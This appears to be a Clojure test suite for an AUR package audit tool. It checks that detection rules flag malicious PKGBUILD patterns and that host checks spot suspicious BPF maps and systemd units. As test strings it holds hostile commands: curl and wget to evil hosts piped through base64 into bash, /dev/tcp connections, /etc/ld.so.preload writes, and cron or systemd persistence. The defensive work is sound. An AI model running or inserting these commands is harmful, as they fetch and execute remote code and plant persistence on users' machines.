(ns aur-audit-test
  (:require [clojure.test :refer [deftest is testing run-tests]]
            [clojure.string :as str]
            [aur-audit :as aa]))

;; --- Helpers (must precede deftests: babashka/sci analyses forward refs) ---

(defn rule-by-id [id]
  (first (filter #(= id (:id %)) aa/rules)))

(defn host-check-by-id [id]
  (first (filter #(= id (:id %)) aa/host-state-checks)))

(defn ok? [x]
  (or (nil? x)
      (and (string? x) (not (re-find #"/(tmp|dev/shm)/" x)))))

;; --- Original (v1.0) regex coverage ---

(deftest net-01-positive
  (let [r (:regex (rule-by-id "NET-01"))]
    (is (some? (re-find r "curl -s https://evil.example/x")))
    (is (some? (re-find r "exec /dev/tcp/1.2.3.4/443")))))

(deftest net-01-positive-matches-edge-cases
  ;; This is a known limitation: the NET-01 rule fires on the *word* `curl`
  ;; inside depends=(...) and source=(...) declarations; it does not
  ;; distinguish between `depends=('curl')` and `curl https://x`. This test
  ;; documents the behaviour rather than asserting avoidance. Future work
  ;; may tighten the regex to exclude `depends=(` / `source=(` contexts.
  (let [r (:regex (rule-by-id "NET-01"))]
    (is (some? (re-find r "depends=('curl')"))
        "Known FP: NET-01 fires on the curl keyword inside depends=(...)")
    (is (nil? (re-find r "depends=('gtk3')"))
        "Sanity check: NET-01 only fires on the listed network utilities")))

(deftest obf-01-positive
  (let [r (:regex (rule-by-id "OBF-01"))]
    (is (some? (re-find r "echo aGk= | base64 -d > /tmp/p")))
    (is (some? (re-find r "eval \"$(curl ...)\"")))))

(deftest exec-01-positive
  (let [r (:regex (rule-by-id "EXEC-01"))]
    (is (some? (re-find r "sh <(curl -s https://x/y)")))))

(deftest pers-01-positive
  (let [r (:regex (rule-by-id "PERS-01"))]
    (is (some? (re-find r "systemctl enable foo.service")))
    (is (some? (re-find r "/etc/systemd/system/foo.service")))
    (is (some? (re-find r "echo '*/5 * * * *' | sudo tee /etc/cron.d/x")))))

(deftest env-01-positive
  (let [r (:regex (rule-by-id "ENV-01"))]
    (is (some? (re-find r "echo 'export PATH=$PATH:/opt/x' >> ~/.bashrc")))
    (is (some? (re-find r "echo malware >> ~/.profile")))
    (is (some? (re-find r "echo 'export X=Y' >> ~/.bash_profile")))
    (is (nil? (re-find r "echo 'PATH=...' >> /etc/profile"))
        "ENV-01 looks for dotfiles; /etc/profile with no leading dot is intentionally NOT matched")))

(deftest write-01-positive
  (let [r (:regex (rule-by-id "WRITE-01"))]
    (is (some? (re-find r "echo 'a' > /etc/ld.so.preload")))
    (is (nil? (re-find r "echo 'b' > pkg/foo.txt")))))

;; --- New (v1.1, June 2026-incident) coverage ---

(deftest npm-01-positive
  (let [r (:regex (rule-by-id "NPM-01"))]
    (is (some? (re-find r "bun install js-digest 2>&1")))
    (is (some? (re-find r "npm i atomic-lockfile --prefix .")))
    (is (some? (re-find r "yarn add lockfile-js")))
    (is (some? (re-find r "pnpm install atomic-lockfile")))))

(deftest npm-01-fp-avoidance
  (let [r (:regex (rule-by-id "NPM-01"))]
    (is (nil? (re-find r "depends=('nodejs')")))
    (is (nil? (re-find r "makedepends=('npm')")))))

(deftest obf-02-positive
  (let [r (:regex (rule-by-id "OBF-02"))]
    (is (some? (re-find r "wget -O- https://evil/x | base64 -d | bash")))
    (is (some? (re-find r "curl https://x/y | base64 -d | python")))))

(deftest obf-02-fp-avoidance
  (let [r (:regex (rule-by-id "OBF-02"))]
    (is (nil? (re-find r "curl https://raw.githubusercontent.com/foo/install.sh | bash"))
        "Naked curl|bash should NOT trigger; base64 -d is required")))

(deftest svc-01-positive
  (let [r (:regex (rule-by-id "SVC-01"))]
    (is (some? (re-find r "ExecStart=/tmp/.X11-unix/launcher")))
    (is (some? (re-find r "ExecStart=/dev/shm/payload")))))

;; --- Host-state checks ---

(deftest host-bpf-01-clean-when-no-hidden-files
  (let [check-fn (:check (host-check-by-id "HOST-BPF-01"))
        result (check-fn)]
    (is (or (nil? result)
            (nil? (re-find #"hidden_" (str result))))
        "No hidden_* BPF maps on a clean CI runner")))

(deftest host-bpf-01-check-handles-permission-denied
  ;; Mock via with-redefs to simulate a non-root /sys/fs/bpf read failure.
  (with-redefs [babashka.fs/list-dir (fn [_] (throw (java.io.FileNotFoundException. "/sys/fs/bpf")))]
    (let [check-fn (:check (host-check-by-id "HOST-BPF-01"))]
      (is (nil? (check-fn))))))

(deftest host-svc-01-check-handles-clean-system
  ;; On a clean system without /tmp|/dev/shm ExecStart anywhere,
  ;; the check should return nil OR a string whose match excludes the IOC.
  (let [check-fn (:check (host-check-by-id "HOST-SVC-01"))
        result (check-fn)]
    (is (ok? result)
        "HOST-SVC-01 gracefully returns nil when no IOC found")))

;; --- Presentation / JSON ---

(deftest json-string-roundtrip
  (let [s (aa/json-str {:a 1 :b "hello" :c true :d nil :e [1 2 {:k "v"}]})]
    (is (str/starts-with? s "{"))
    (is (str/ends-with? s "}"))
    (is (str/includes? s "\"a\":1"))
    (is (str/includes? s "\"b\":\"hello\""))
    (is (str/includes? s "\"c\":true"))
    (is (str/includes? s "\"d\":null"))
    (is (str/includes? s "\"e\":[1,2,{\"k\":\"v\"}]"))))

(deftest json-string-escapes-specials
  (let [s (aa/json-string "he said \"hi\" \\end\n\t\r")]
    (is (str/includes? s "\\\\"))
    (is (str/includes? s "\\\""))
    (is (str/includes? s "\\n"))
    (is (str/includes? s "\\t"))
    (is (str/includes? s "\\r"))))

(defn -main [& _]
  (let [summary (run-tests 'aur-audit-test)]
    (System/exit (if (zero? (:fail summary)) 0 1))))
